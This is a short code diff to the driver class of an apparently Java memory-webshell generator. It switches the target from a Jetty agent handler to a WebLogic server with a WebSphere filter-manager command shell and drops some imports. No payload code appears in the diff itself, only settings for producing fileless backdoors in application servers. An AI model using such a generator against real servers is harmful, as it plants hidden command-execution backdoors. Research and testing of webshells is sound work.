@@ -1,14 +1,12 @@
 package com.reajason.javaweb;
 
 import com.reajason.javaweb.memshell.AbstractShell;
-import com.reajason.javaweb.memshell.JettyShell;
-import com.reajason.javaweb.memshell.WebLogicShell;
+import com.reajason.javaweb.memshell.WebSphereShell;
 import com.reajason.javaweb.memshell.config.*;
 import com.reajason.javaweb.memshell.packer.Packer;
 import com.reajason.javaweb.memshell.utils.CommonUtil;
 import lombok.SneakyThrows;
 import net.bytebuddy.jar.asm.Opcodes;
-import org.apache.commons.codec.binary.Base64;
 import org.apache.commons.lang3.StringUtils;
 
 import java.io.IOException;
@@ -23,9 +21,9 @@ public class GeneratorMain {
 
     public static void main(String[] args) throws IOException {
         ShellConfig shellConfig = ShellConfig.builder()
-                .server(Server.Jetty)
+                .server(Server.WebLogic)
                 .shellTool(ShellTool.Command)
-                .shellType(JettyShell.AGENT_HANDLER)
+                .shellType(WebSphereShell.AGENT_FILTER_MANAGER)
                 .targetJreVersion(Opcodes.V1_6)
                 .debug(true)
                 .build();
